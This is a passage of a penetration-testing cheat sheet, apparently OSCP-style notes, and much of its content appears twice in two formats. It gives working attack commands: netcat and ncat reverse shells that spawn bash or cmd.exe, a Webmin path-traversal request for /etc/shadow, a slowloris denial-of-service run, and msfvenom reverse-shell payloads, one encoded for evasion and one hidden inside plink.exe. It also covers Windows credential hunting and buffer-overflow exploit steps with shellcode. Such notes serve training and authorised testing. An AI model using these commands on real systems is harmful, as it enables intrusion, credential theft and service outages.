cat <file name> | paste -sd "," -
```

- Cut a string by a delimiter, filter results then sort

```Shell
grep "href=" index.html | cut -d "/" -f 3 | grep "\\." | cut -d '"' -f 1 | sort -u
```

- Using Grep and regular expressions and output to a file

```Shell
cat index.html | grep -o 'http://\[^"\]\*' | cut -d "/" -f 3 | sort u > list.txt
```

- Use a bash loop to find the IP address behind each host

```Shell
for url in $(cat list.txt); do host $url; done
```

- Collect all the IP Addresses from a log file and sort by frequency

```Shell
cat access.log | cut -d " " -f 1 | sort | uniq -c | sort -urn
```

## Decoding using Kali

- Decode Base64 Encoded Values

```Shell
echo -n "QWxhZGRpbjpvcGVuIHNlc2FtZQ==" | base64 --decode
```

- Decode Hexidecimal Encoded Values

```Shell
echo -n "46 4c 34 36 5f 33 3a 32 396472796 63637756 8656874" | xxd -r -ps
```

- ROT13 file content

```Shell
cat <file_name> | tr '[A-Za-z]' '[N-ZA-Mn-za-m]'
```

- Extracting a password from a hex dump file

```Shell
# reverse hexdump
$ xxd -r data.txt foobar.bin

$ zcat foobar.bin | file -
bzip2 compressed data, block size = 900k

$ zcat foobar.bin | bzcat | file -
gzip compressed data, was "data4.bin", from Unix, last modified: Thu Sep 28 14:04:06 2017, max compression

$ zcat foobar.bin | bzcat | zcat | file -
POSIX tar archive (GNU)

$ zcat foobar.bin | bzcat | zcat | tar xO | file -
POSIX tar archive (GNU)

$ zcat foobar.bin | bzcat | zcat | tar xO | tar xO | file -
bzip2 compressed data, block size = 900k

$ zcat foobar.bin | bzcat | zcat | tar xO | tar xO | bzcat | file -
POSIX tar archive (GNU)

$ zcat foobar.bin | bzcat | zcat | tar xO | tar xO | bzcat | tar xO | file -
gzip compressed data, was "data9.bin", from Unix, last modified: Thu Sep 28 14:04:06 2017, max compression

$ zcat foobar.bin | bzcat | zcat | tar xO | tar xO | bzcat | tar xO | zcat | file -
ASCII text

$ zcat foobar.bin | bzcat | zcat | tar xO | tar xO | bzcat | tar xO | zcat | cat -
The password is 8ZjyCRiBWFYkneahHwxCv3wb2a1ORpYL
```

## Networking

- Manage network interfaces

```Shell
vi /etc/network/interfaces
```

- Set static ip

```Shell
vi /etc/network/interfaces

# The primary network interface
auto eth0
iface eth0 inet static
address 10.0.0.100
netmask 255.255.255.0
gateway 10.0.0.1
```
Restart networking with `$ service networking restart`

## Netcat - Read and write TCP and UDP Packets

- Download Netcat for Windows (handy for creating reverse shells and transfering files on windows systems):
        [https://joncraton.org/blog/46/netcat-for-windows/](https://joncraton.org/blog/46/netcat-for-windows/)

- Connect to a POP3 mail server

```Shell
nc -nv $ip 110
```

- Listen on TCP/UDP port

```Shell
nc -nlvp 4444
```

- Connect to a netcat port

```Shell
nc -nv $ip 4444
```

- Send a file using netcat

```Shell
nc -nv $ip 4444 < /usr/share/windows-binaries/wget.exe
```

- Receive a file using netcat

```Shell
nc -nlvp 4444 > incoming.exe
```

- Some OSs (OpenBSD) will use nc.traditional rather than nc so watch out for that...

  `$ whereis nc`

  nc: /bin/nc.traditional /usr/share/man/man1/nc.1.gz

  /bin/nc.traditional -e /bin/bash 1.2.3.4 4444

- Create a reverse shell with Ncat using cmd.exe on Windows

```Shell
nc.exe -nlvp 4444 -e cmd.exe
```

or

```Shell
nc.exe -nv <Remote IP> <Remote Port> -e cmd.exe
```

- Create a reverse shell with Ncat using bash on Linux

```Shell
nc -nv $ip 4444 -e /bin/bash
```

- Netcat for Banner Grabbing:

```Shell
echo "" | nc -nv -w1 <IP Address> <Ports>
```

## Ncat - Netcat for Nmap project which provides more security avoid IDS

- Reverse shell from windows using cmd.exe using ssl

```Shell
ncat --exec cmd.exe --allow $ip -vnl 4444 --ssl
```

- Listen on port 4444 using ssl

```Shell
ncat -v $ip 4444 --ssl
```

## Wireshark

- Show only SMTP (port 25) and ICMP traffic:

```Shell
tcp.port eq 25 or icmp
```

- Show only traffic in the LAN (192.168.x.x), between workstations and servers -- no Internet:

```Shell
ip.src==192.168.0.0/16 and ip.dst==192.168.0.0/16
```

- Filter by a protocol ( e.g. SIP ) and filter out unwanted IPs:

```Shell
ip.src != xxx.xxx.xxx.xxx && ip.dst != xxx.xxx.xxx.xxx && sip
```

- Some commands are equal

```Shell
ip.addr == xxx.xxx.xxx.xxx
```

Equals

```Shell
ip.src == xxx.xxx.xxx.xxx or ip.dst == xxx.xxx.xxx.xxx
```

```Shell
 ip.addr != xxx.xxx.xxx.xxx
```

Equals

```Shell
ip.src != xxx.xxx.xxx.xxx or ip.dst != xxx.xxx.xxx.xxx
```

## Tcpdump

- Display a pcap file

```Shell
tcpdump -r passwordz.pcap
```

- Display ips and filter and sort

```Shell
tcpdump -n -r passwordz.pcap | awk -F" " '{print $3}' | sort -u | head
```

- Grab a packet capture on port 80

```Shell
tcpdump tcp port 80 -w output.pcap -i eth0
```

- Check for ACK or PSH flag set in a TCP packet

```Shell
tcpdump -A -n 'tcp[13] = 24' -r passwordz.pcap
```

## IPTables

- Deny traffic to ports except for Local Loopback

```Shell
iptables -A INPUT -p tcp --destination-port 13327 ! -d $ip -j DROP
```


```Shell
iptables -A INPUT -p tcp --destination-port 9991 ! -d $ip -j DROP
```

- Clear ALL IPTables firewall rules

```Shell
  iptables -P INPUT ACCEPT
  iptables -P FORWARD ACCEPT
  iptables -P OUTPUT ACCEPT
  iptables -t nat -F
  iptables -t mangle -F
  iptables -F
  iptables -X
  iptables -t raw -F iptables -t raw -X
```

## Users manipulation

- Adding a new user

```Shell
adduser <user name>
```

- Adding a User to the sudoers File

```Shell
adduser <user name> sudo
```

- Switching Users

```Shell
su <user name>
```

-   Set the Target IP Address to the `$ip` system variable  
    `export ip=192.168.1.100`

-   Find the location of a file  
    `locate sbd.exe`

-   Search through directories in the `$PATH` environment variable  
    `which sbd`

-   Find a search for a file that contains a specific string in its
    name:  
    `find / -name sbd\*`

-   Show active internet connections  
    `netstat -lntp`

-   Change Password  
    `passwd`

-   Verify a service is running and listening  
    `netstat -antp |grep apache`

-   Start a service  
    `systemctl start ssh  `
    
    `systemctl start apache2`

-   Have a service start at boot  
    `systemctl enable ssh`

-   Stop a service  
    `systemctl stop ssh`

-   Unzip a gz file  
    `gunzip access.log.gz`

-   Unzip a tar.gz file  
    `tar -xzvf file.tar.gz`

-   Search command history  
    `history | grep phrase_to_search_for`

-   Download a webpage  
    `wget http://www.cisco.com`

-   Open a webpage  
    `curl http://www.cisco.com`

-   String manipulation

    -   Count number of lines in file  
        `wc -l index.html`

    -   Get the start or end of a file  
        `head index.html`
        
        `tail index.html`

    -   Extract all the lines that contain a string  
        `grep "href=" index.html`

    -   Cut a string by a delimiter, filter results then sort  
        `grep "href=" index.html | cut -d "/" -f 3 | grep "\\." | cut -d '"' -f 1 | sort -u`

    -   Using Grep and regular expressions and output to a file  
        `cat index.html | grep -o 'http://\[^"\]\*' | cut -d "/" -f 3 | sort u > list.txt`

    -   Use a bash loop to find the IP address behind each host  
        `for url in $(cat list.txt); do host $url; done`

    -   Collect all the IP Addresses from a log file and sort by
        frequency  
        `cat access.log | cut -d " " -f 1 | sort | uniq -c | sort -urn`

-   Decoding using Kali

    -   Decode Base64 Encoded Values
       
        `echo -n "QWxhZGRpbjpvcGVuIHNlc2FtZQ==" | base64 --decode`

    -   Decode Hexidecimal Encoded Values  
        `echo -n "46 4c 34 36 5f 33 3a 32 396472796 63637756 8656874" | xxd -r -ps`

-   Netcat - Read and write TCP and UDP Packets

    -   Download Netcat for Windows (handy for creating reverse shells and transfering files on windows systems):
        [https://joncraton.org/blog/46/netcat-for-windows/](https://joncraton.org/blog/46/netcat-for-windows/)

    -   Connect to a POP3 mail server  
        `nc -nv $ip 110`

    -   Listen on TCP/UDP port  
        `nc -nlvp 4444`

    -   Connect to a netcat port  
        `nc -nv $ip 4444`

    -   Send a file using netcat  
        `nc -nv $ip 4444 < /usr/share/windows-binaries/wget.exe`

    -   Receive a file using netcat  
        `nc -nlvp 4444 > incoming.exe`
        
    -   Some OSs (OpenBSD) will use nc.traditional rather than nc so watch out for that...
         
            whereis nc
            nc: /bin/nc.traditional /usr/share/man/man1/nc.1.gz

            /bin/nc.traditional -e /bin/bash 1.2.3.4 4444


    -   Create a reverse shell with Ncat using cmd.exe on Windows  
        `nc.exe -nlvp 4444 -e cmd.exe`
        
        or
        
        `nc.exe -nv <Remote IP> <Remote Port> -e cmd.exe`

    -   Create a reverse shell with Ncat using bash on Linux  
        `nc -nv $ip 4444 -e /bin/bash`
        
    -   Netcat for Banner Grabbing:
    
        `echo "" | nc -nv -w1 <IP Address> <Ports>`

-   Ncat - Netcat for Nmap project which provides more security avoid
    IDS

    -   Reverse shell from windows using cmd.exe using ssl  
        `ncat --exec cmd.exe --allow $ip -vnl 4444 --ssl`

    -   Listen on port 4444 using ssl  
        `ncat -v $ip 4444 --ssl`

-   Wireshark
    -   Show only SMTP (port 25) and ICMP traffic:
    
        `tcp.port eq 25 or icmp`
        
    -   Show only traffic in the LAN (192.168.x.x), between workstations and servers -- no Internet:
        
        `ip.src==192.168.0.0/16 and ip.dst==192.168.0.0/16`
        
    -   Filter by a protocol ( e.g. SIP ) and filter out unwanted IPs:
        
        `ip.src != xxx.xxx.xxx.xxx && ip.dst != xxx.xxx.xxx.xxx && sip`
        
    -   Some commands are equal
        
        `ip.addr == xxx.xxx.xxx.xxx`
        
         Equals
        
        `ip.src == xxx.xxx.xxx.xxx or ip.dst == xxx.xxx.xxx.xxx `

        ` ip.addr != xxx.xxx.xxx.xxx`
        
         Equals
        
        `ip.src != xxx.xxx.xxx.xxx or ip.dst != xxx.xxx.xxx.xxx`

-   Tcpdump

    -   Display a pcap file  
       `tcpdump -r passwordz.pcap`

    -   Display ips and filter and sort  
        `tcpdump -n -r passwordz.pcap | awk -F" " '{print $3}' | sort -u | head`

    -   Grab a packet capture on port 80  
        `tcpdump tcp port 80 -w output.pcap -i eth0`

    -   Check for ACK or PSH flag set in a TCP packet  
        `tcpdump -A -n 'tcp[13] = 24' -r passwordz.pcap`

-   IPTables 

    -   Deny traffic to ports except for Local Loopback

        `iptables -A INPUT -p tcp --destination-port 13327 ! -d $ip -j DROP  `
    
        `iptables -A INPUT -p tcp --destination-port 9991 ! -d $ip -j DROP`

    -   Clear ALL IPTables firewall rules
    
            ```bash
            iptables -P INPUT ACCEPT
            iptables -P FORWARD ACCEPT
            iptables -P OUTPUT ACCEPT
            iptables -t nat -F
            iptables -t mangle -F
            iptables -F
            iptables -X
            iptables -t raw -F iptables -t raw -X
            ```

Information Gathering & Vulnerability Scanning
===================================================================================================================================

-   Passive Information Gathering
    ---------------------------------------------------------------------------------------------------------------------------

-   Google Hacking

    -   Google search to find website sub domains  
        `site:microsoft.com`

    -   Google filetype, and intitle  
        `intitle:"netbotz appliance" "OK" -filetype:pdf`

    -   Google inurl  
        `inurl:"level/15/sexec/-/show"`

    -   Google Hacking Database:  
        https://www.exploit-db.com/google-hacking-database/

-   SSL Certificate Testing  
    [https://www.ssllabs.com/ssltest/analyze.html](https://www.ssllabs.com/ssltest/analyze.html)

-   Email Harvesting

    -   Simply Email  
        `git clone https://github.com/killswitch-GUI/SimplyEmail.git  `
        
        `./SimplyEmail.py -all -e TARGET-DOMAIN`

-   Netcraft

    -   Determine the operating system and tools used to build a site  
        https://searchdns.netcraft.com/

-   Whois Enumeration  
    `whois domain-name-here.com  `
    
    `whois $ip`

-   Banner Grabbing

    -   `nc -v $ip 25`

    -   `telnet $ip 25`

    -   `nc TARGET-IP 80`

-   Recon-ng - full-featured web reconnaissance framework written in Python

    -   `cd /opt; git clone https://LaNMaSteR53@bitbucket.org/LaNMaSteR53/recon-ng.git  `
    
        `cd /opt/recon-ng  `
        
        `./recon-ng  `
        
        `show modules  `
        
        `help`

-   Active Information Gathering
    --------------------------------------------------------------------------------------------------------------------------

<!-- -->


-   Port Scanning
    -----------------------------------------------------------------------------------------------------------
*Subnet Reference Table*

/ | Addresses | Hosts | Netmask | Amount of a Class C
--- | --- | --- | --- | --- 
/30 | 4 | 2 | 255.255.255.252| 1/64
/29 | 8 | 6 | 255.255.255.248 | 1/32
/28 | 16 | 14 | 255.255.255.240 | 1/16
/27 | 32 | 30 | 255.255.255.224 | 1/8
/26 | 64 | 62 | 255.255.255.192 | 1/4
/25 | 128 | 126 | 255.255.255.128 | 1/2
/24 | 256 | 254 | 255.255.255.0 | 1
/23 | 512 | 510 | 255.255.254.0 | 2
/22 | 1024 | 1022 | 255.255.252.0 | 4
/21 | 2048 | 2046 | 255.255.248.0 | 8
/20 | 4096 | 4094 | 255.255.240.0 | 16
/19 | 8192 | 8190 | 255.255.224.0 | 32
/18 | 16384 | 16382 | 255.255.192.0 | 64
/17 | 32768 | 32766 | 255.255.128.0 | 128
/16 | 65536 | 65534 | 255.255.0.0 | 256

 -   Set the ip address as a variable  
     `export ip=192.168.1.100  `
     `nmap -A -T4 -p- $ip`

 -   Netcat port Scanning  
     `nc -nvv -w 1 -z $ip 3388-3390`
     
 -   Discover active IPs usign ARP on the network:
     `arp-scan $ip/24`

 -   Discover who else is on the network  
     `netdiscover`

 -   Discover IP Mac and Mac vendors from ARP  
     `netdiscover -r $ip/24`

 -   Nmap stealth scan using SYN  
     `nmap -sS $ip`

 -   Nmap stealth scan using FIN  
     `nmap -sF $ip`

 -   Nmap Banner Grabbing  
     `nmap -sV -sT $ip`

 -   Nmap OS Fingerprinting  
     `nmap -O $ip`

 -   Nmap Regular Scan:  
     `nmap $ip/24`

 -   Enumeration Scan  
     `nmap -p 1-65535 -sV -sS -A -T4 $ip/24 -oN nmap.txt`

 -   Enumeration Scan All Ports TCP / UDP and output to a txt file  
     `nmap -oN nmap2.txt -v -sU -sS -p- -A -T4 $ip`

 -   Nmap output to a file:  
     `nmap -oN nmap.txt -p 1-65535 -sV -sS -A -T4 $ip/24`

 -   Quick Scan:  
     `nmap -T4 -F $ip/24`

 -   Quick Scan Plus:  
     `nmap -sV -T4 -O -F --version-light $ip/24`

 -   Quick traceroute  
     `nmap -sn --traceroute $ip`

 -   All TCP and UDP Ports  
     `nmap -v -sU -sS -p- -A -T4 $ip`

 -   Intense Scan:  
     `nmap -T4 -A -v $ip`

 -   Intense Scan Plus UDP  
     `nmap -sS -sU -T4 -A -v $ip/24`

 -   Intense Scan ALL TCP Ports  
     `nmap -p 1-65535 -T4 -A -v $ip/24`

 -   Intense Scan - No Ping  
     `nmap -T4 -A -v -Pn $ip/24`

 -   Ping scan  
     `nmap -sn $ip/24`

 -   Slow Comprehensive Scan  
     `nmap -sS -sU -T4 -A -v -PE -PP -PS80,443 -PA3389 -PU40125 -PY -g 53 --script "default or (discovery and safe)" $ip/24`

 -   Scan with Active connect in order to weed out any spoofed ports designed to troll you  
     `nmap -p1-65535 -A -T5 -sT $ip`

-   Enumeration
    -----------

-   DNS Enumeration

    -   NMAP DNS Hostnames Lookup
        `nmap -F --dns-server <dns server ip> <target ip range>`
        
    -   Host Lookup  
        `host -t ns megacorpone.com`

    -   Reverse Lookup Brute Force - find domains in the same range  
        `for ip in $(seq 155 190);do host 50.7.67.$ip;done |grep -v "not found"`

    -   Perform DNS IP Lookup  
        `dig a domain-name-here.com @nameserver`

    -   Perform MX Record Lookup  
        `dig mx domain-name-here.com @nameserver`

    -   Perform Zone Transfer with DIG  
        `dig axfr domain-name-here.com @nameserver`

    -   DNS Zone Transfers  
        Windows DNS zone transfer  
        
        `nslookup -> set type=any -> ls -d blah.com  `
        
        Linux DNS zone transfer  
        
        `dig axfr blah.com @ns1.blah.com`
        
    -   Dnsrecon DNS Brute Force  
        `dnsrecon -d TARGET -D /usr/share/wordlists/dnsmap.txt -t std --xml ouput.xml`

    -   Dnsrecon DNS List of megacorp  
        `dnsrecon -d megacorpone.com -t axfr`

    -   DNSEnum  
        `dnsenum zonetransfer.me`

-   NMap Enumeration Script List:

    -   NMap Discovery  
        [*https://nmap.org/nsedoc/categories/discovery.html*](https://nmap.org/nsedoc/categories/discovery.html)

    -   Nmap port version detection MAXIMUM power  
        `nmap -vvv -A --reason --script="+(safe or default) and not broadcast" -p <port> <host>`


-   NFS (Network File System) Enumeration

    -   Show Mountable NFS Shares 
        `nmap -sV --script=nfs-showmount $ip`

-   RPC (Remote Procedure Call) Enumeration

    -   Connect to an RPC share without a username and password and enumerate privledges
        `rpcclient --user="" --command=enumprivs -N $ip`

    -   Connect to an RPC share with a username and enumerate privledges
        `rpcclient --user="<Username>" --command=enumprivs $ip`


-   SMB Enumeration

    -   SMB OS Discovery  
        `nmap $ip --script smb-os-discovery.nse`

    -   Nmap port scan  
        `nmap -v -p 139,445 -oG smb.txt $ip-254`

    -   Netbios Information Scanning  
        `nbtscan -r $ip/24`

    -   Nmap find exposed Netbios servers  
        `nmap -sU --script nbstat.nse -p 137 $ip`
        
    -   Nmap all SMB scripts scan
    
        `nmap -sV -Pn -vv -p 445 --script='(smb*) and not (brute or broadcast or dos or external or fuzzer)' --script-args=unsafe=1 $ip`

    -   Nmap all SMB scripts authenticated scan
    
        `nmap -sV -Pn -vv -p 445  --script-args smbuser=<username>,smbpass=<password> --script='(smb*) and not (brute or broadcast or dos or external or fuzzer)' --script-args=unsafe=1 $ip`

    -   SMB Enumeration Tools  
        `nmblookup -A $ip  `
        
        `smbclient //MOUNT/share -I $ip -N  `
        
        `rpcclient -U "" $ip  `
        
        `enum4linux $ip  `
        
        `enum4linux -a $ip`
        

    -   SMB Finger Printing  
        `smbclient -L //$ip`

    -   Nmap Scan for Open SMB Shares  
        `nmap -T4 -v -oA shares --script smb-enum-shares --script-args smbuser=username,smbpass=password -p445 192.168.10.0/24`

    -   Nmap scans for vulnerable SMB Servers  
        `nmap -v -p 445 --script=smb-check-vulns --script-args=unsafe=1 $ip`

    -   Nmap List all SMB scripts installed  
        `ls -l /usr/share/nmap/scripts/smb*`

    -   Enumerate SMB Users
    
        `nmap -sU -sS --script=smb-enum-users -p U:137,T:139 $ip-14`
        
         OR        
         
         `python /usr/share/doc/python-impacket-doc/examples /samrdump.py $ip`
         

    -   RID Cycling - Null Sessions  
        `ridenum.py $ip 500 50000 dict.txt`

    -   Manual Null Session Testing
    
        Windows: `net use \\$ip\IPC$ "" /u:""`
        
        Linux: `smbclient -L //$ip`
        

-   SMTP Enumeration - Mail Severs

    -   Verify SMTP port using Netcat  
        `nc -nv $ip 25`

-   POP3 Enumeration - Reading other peoples mail - You may find usernames and passwords for email accounts, so here is how to check the mail using Telnet

         root@kali:~# telnet $ip 110
         +OK beta POP3 server (JAMES POP3 Server 2.3.2) ready 
         USER billydean    
         +OK
         PASS password
         +OK Welcome billydean
         
         list
         
         +OK 2 1807
         1 786
         2 1021
      
         retr 1
         
         +OK Message follows
         From: jamesbrown@motown.com
         Dear Billy Dean,

         Here is your login for remote desktop ... try not to forget it this time!
         username: billydean
         password: PA$$W0RD!Z


-   SNMP Enumeration -Simple Network Management Protocol

    -   Fix SNMP output values so they are human readable  
        `apt-get install snmp-mibs-downloader download-mibs  `
        `echo "" > /etc/snmp/snmp.conf`

    -   SNMP Enumeration Commands

        -   `snmpcheck -t $ip -c public`

        -   `snmpwalk -c public -v1 $ip 1|`

        -   `grep hrSWRunName|cut -d\* \* -f`

        -   `snmpenum -t $ip`

        -   `onesixtyone -c names -i hosts`

    -   SNMPv3 Enumeration  
        `nmap -sV -p 161 --script=snmp-info $ip/24`

    -   Automate the username enumeration process for SNMPv3:  
        `apt-get install snmp snmp-mibs-downloader  `
        `wget https://raw.githubusercontent.com/raesene/TestingScripts/master/snmpv3enum.rb`

    -   SNMP Default Credentials  
        /usr/share/metasploit-framework/data/wordlists/snmp\_default\_pass.txt


-   MS SQL Server Enumeration

    -   Nmap Information Gathering
        
        `nmap -p 1433 --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes  --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER $ip`
        
-   Webmin and miniserv/0.01 Enumeration - Port 10000

      Test for LFI & file disclosure vulnerability by grabbing /etc/passwd
        
        `curl http://$ip:10000//unauthenticated/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/etc/passwd`
        
      Test to see if webmin is running as root by grabbing /etc/shadow
      
        `curl http://$ip:10000//unauthenticated/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/etc/shadow`

-   Linux OS Enumeration

    -   List all SUID files  
        `find / -perm -4000 2>/dev/null`

    -   Determine the current version of Linux  
        `cat /etc/issue`

    -   Determine more information about the environment  
        `uname -a`
        
    -   List processes running  
        `ps -xaf`

    -   List the allowed (and forbidden) commands for the invoking use  
        `sudo -l`

    -   List iptables rules  
        `iptables --table nat --list  
        iptables -vL -t filter  
        iptables -vL -t nat  
        iptables -vL -t mangle  
        iptables -vL -t raw  
        iptables -vL -t security`

-   Windows OS Enumeration


    -   net config Workstation
    
    -   systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
    
    -   hostname
    
    -   net users
    
    -   ipconfig /all
    
    -   route print
    
    -   arp -A
    
    -   netstat -ano
    
    -   netsh firewall show state	
    
    -   netsh firewall show config
    
    -   schtasks /query /fo LIST /v
    
    -   tasklist /SVC
    
    -   net start
    
    -   DRIVERQUERY
    
    -   reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated
    
    -   reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated
    
    -   dir /s *pass* == *cred* == *vnc* == *.config*
    
    -   findstr /si password *.xml *.ini *.txt
    
    -   reg query HKLM /f password /t REG_SZ /s
    
    -   reg query HKCU /f password /t REG_SZ /s

-   Vulnerability Scanning with Nmap

-   Nmap Exploit Scripts  
    [*https://nmap.org/nsedoc/categories/exploit.html*](https://nmap.org/nsedoc/categories/exploit.html)

-   Nmap search through vulnerability scripts  
    `cd /usr/share/nmap/scripts/  
    ls -l \*vuln\*`

-   Nmap search through Nmap Scripts for a specific keyword  
    `ls /usr/share/nmap/scripts/\* | grep ftp`

-   Scan for vulnerable exploits with nmap  
    `nmap --script exploit -Pn $ip`

-   NMap Auth Scripts  
    [*https://nmap.org/nsedoc/categories/auth.html*](https://nmap.org/nsedoc/categories/auth.html)

-   Nmap Vuln Scanning  
    [*https://nmap.org/nsedoc/categories/vuln.html*](https://nmap.org/nsedoc/categories/vuln.html)

-   NMap DOS Scanning  
    `nmap --script dos -Pn $ip  
    NMap Execute DOS Attack  
    nmap --max-parallelism 750 -Pn --script http-slowloris --script-args
    http-slowloris.runforever=true`

-   Scan for coldfusion web vulnerabilities  
    `nmap -v -p 80 --script=http-vuln-cve2010-2861 $ip`

-   Anonymous FTP dump with Nmap  
    `nmap -v -p 21 --script=ftp-anon.nse $ip-254`

-   SMB Security mode scan with Nmap  
    `nmap -v -p 21 --script=ftp-anon.nse $ip-254`

-   File Enumeration

    -   Find UID 0 files root execution

    -   `/usr/bin/find / -perm -g=s -o -perm -4000 ! -type l -maxdepth 3 -exec ls -ld {} \\; 2>/dev/null`

    -   Get handy linux file system enumeration script (/var/tmp)  
        `wget https://highon.coffee/downloads/linux-local-enum.sh  `
        `chmod +x ./linux-local-enum.sh  `
        `./linux-local-enum.sh`

    -   Find executable files updated in August  
        `find / -executable -type f 2> /dev/null | egrep -v "^/bin|^/var|^/etc|^/usr" | xargs ls -lh | grep Aug`

    -   Find a specific file on linux  
        `find /. -name suid\*`

    -   Find all the strings in a file  
        `strings <filename>`

    -   Determine the type of a file  
        `file <filename>`

-   HTTP Enumeration
    ----------------

    -   Search for folders with gobuster:  
        `gobuster -w /usr/share/wordlists/dirb/common.txt -u $ip`

    -   OWasp DirBuster - Http folder enumeration - can take a dictionary file

    -   Dirb - Directory brute force finding using a dictionary file  
        `dirb http://$ip/ wordlist.dict  `
        `dirb <http://vm/>  `
          
        Dirb against a proxy

    -   `dirb [http://$ip/](http://172.16.0.19/) -p $ip:3129`

    -   Nikto  
        `nikto -h $ip`

    -   HTTP Enumeration with NMAP  
        `nmap --script=http-enum -p80 -n $ip/24`

    -   Nmap Check the server methods  
        `nmap --script http-methods --script-args http-methods.url-path='/test' $ip`

    -   Get Options available from web server
         `curl -vX OPTIONS vm/test`

      -   Uniscan directory finder:  
          `uniscan -qweds -u <http://vm/>`

      -   Wfuzz - The web brute forcer
      
          `wfuzz -c -w /usr/share/wfuzz/wordlist/general/megabeast.txt $ip:60080/?FUZZ=test  `
          
          `wfuzz -c --hw 114 -w /usr/share/wfuzz/wordlist/general/megabeast.txt $ip:60080/?page=FUZZ  `
          
          `wfuzz -c -w /usr/share/wfuzz/wordlist/general/common.txt "$ip:60080/?page=mailer&mail=FUZZ"`
          
          `wfuzz -c -w /usr/share/seclists/Discovery/Web_Content/common.txt --hc 404 $ip/FUZZ`
          
          Recurse level 3
          
          `wfuzz -c -w /usr/share/seclists/Discovery/Web_Content/common.txt -R 3 --sc 200 $ip/FUZZ`

<!-- -->

-   Open a service using a port knock (Secured with Knockd)  
    for x in 7000 8000 9000; do nmap -Pn --host\_timeout 201
    --max-retries 0 -p $x server\_ip\_address; done

-   WordPress Scan - Wordpress security scanner

    -   wpscan --url $ip/blog --proxy $ip:3129

-   RSH Enumeration - Unencrypted file transfer system

    -   auxiliary/scanner/rservices/rsh\_login

-   Finger Enumeration

    -   finger @$ip

    -   finger batman@$ip

-   TLS & SSL Testing

    -   ./testssl.sh -e -E -f -p -y -Y -S -P -c -H -U $ip | aha >
        OUTPUT-FILE.html

-   Proxy Enumeration (useful for open proxies)

    -   nikto -useproxy http://$ip:3128 -h $ip

-   Steganography

> apt-get install steghide
>
> steghide extract -sf picture.jpg
>
> steghide info picture.jpg
>
> apt-get install stegosuite

-   The OpenVAS Vulnerability Scanner

    -   apt-get update  
        apt-get install openvas  
        openvas-setup

    -   netstat -tulpn

    -   Login at:  
        https://$ip:9392

Buffer Overflows and Exploits
===================================================================================================================================

-   DEP and ASLR - Data Execution Prevention (DEP) and Address Space
    Layout Randomization (ASLR)


-   Nmap Fuzzers:

    -   NMap Fuzzer List  
        [https://nmap.org/nsedoc/categories/fuzzer.html](https://nmap.org/nsedoc/categories/fuzzer.html)

    -   NMap HTTP Form Fuzzer  
        nmap --script http-form-fuzzer --script-args
        'http-form-fuzzer.targets={1={path=/},2={path=/register.html}}'
        -p 80 $ip

    -   Nmap DNS Fuzzer  
        nmap --script dns-fuzz --script-args timelimit=2h $ip -d

-   MSFvenom  
    [*https://www.offensive-security.com/metasploit-unleashed/msfvenom/*](https://www.offensive-security.com/metasploit-unleashed/msfvenom/)

-   Windows Buffer Overflows

    -   Controlling EIP
    
             locate pattern_create
             pattern_create.rb -l 2700
             locate pattern_offset
             pattern_offset.rb -q 39694438

    -   Verify exact location of EIP - [\*] Exact match at offset 2606

            buffer = "A" \* 2606 + "B" \* 4 + "C" \* 90

    -   Check for Bad Characters - Run multiple times 0x00 - 0xFF

    -   Use Mona to determine a module that is unprotected

    -   Bypass DEP if present by finding a Memory Location with Read and Execute access for JMP ESP

    -   Use NASM to determine the HEX code for a JMP ESP instruction

            /usr/share/metasploit-framework/tools/exploit/nasm_shell.rb

            JMP ESP  
            00000000 FFE4 jmp esp

    -   Run Mona in immunity log window to find (FFE4) XEF command

            !mona find -s "\xff\xe4" -m slmfc.dll  
            found at 0x5f4a358f - Flip around for little endian format
            buffer = "A" * 2606 + "\x8f\x35\x4a\x5f" + "C" * 390

    -   MSFVenom to create payload
    
            msfvenom -p windows/shell_reverse_tcp LHOST=$ip LPORT=443 -f c e x86/shikata_ga_nai -b "\x00\x0a\x0d"

    -   Final Payload with NOP slide  
    
            buffer="A"*2606 + "\x8f\x35\x4a\x5f" + "\x90" * 8 + shellcode

    -   Create a PE Reverse Shell  
        msfvenom -p windows/shell\_reverse\_tcp LHOST=$ip LPORT=4444
        -f  
        exe -o shell\_reverse.exe

    -   Create a PE Reverse Shell and Encode 9 times with
        Shikata\_ga\_nai  
        msfvenom -p windows/shell\_reverse\_tcp LHOST=$ip LPORT=4444
        -f  
        exe -e x86/shikata\_ga\_nai -i 9 -o
        shell\_reverse\_msf\_encoded.exe

    -   Create a PE reverse shell and embed it into an existing
        executable  
        msfvenom -p windows/shell\_reverse\_tcp LHOST=$ip LPORT=4444 -f
        exe -e x86/shikata\_ga\_nai -i 9 -x
        /usr/share/windows-binaries/plink.exe -o
        shell\_reverse\_msf\_encoded\_embedded.exe

    -   Create a PE Reverse HTTPS shell  
        msfvenom -p windows/meterpreter/reverse\_https LHOST=$ip
        LPORT=443 -f exe -o met\_https\_reverse.exe

-   Linux Buffer Overflows

    -   Run Evans Debugger against an app  
        edb --run /usr/games/crossfire/bin/crossfire

    -   ESP register points toward the end of our CBuffer  
        add eax,12  
        jmp eax  
        83C00C add eax,byte +0xc  
        FFE0 jmp eax

    -   Check for Bad Characters Process of elimination - Run multiple
        times 0x00 - 0xFF

    -   Find JMP ESP address  
        "\\x97\\x45\\x13\\x08" \# Found at Address 08134597

    -   crash = "\\x41" \* 4368 + "\\x97\\x45\\x13\\x08" +
        "\\x83\\xc0\\x0c\\xff\\xe0\\x90\\x90"

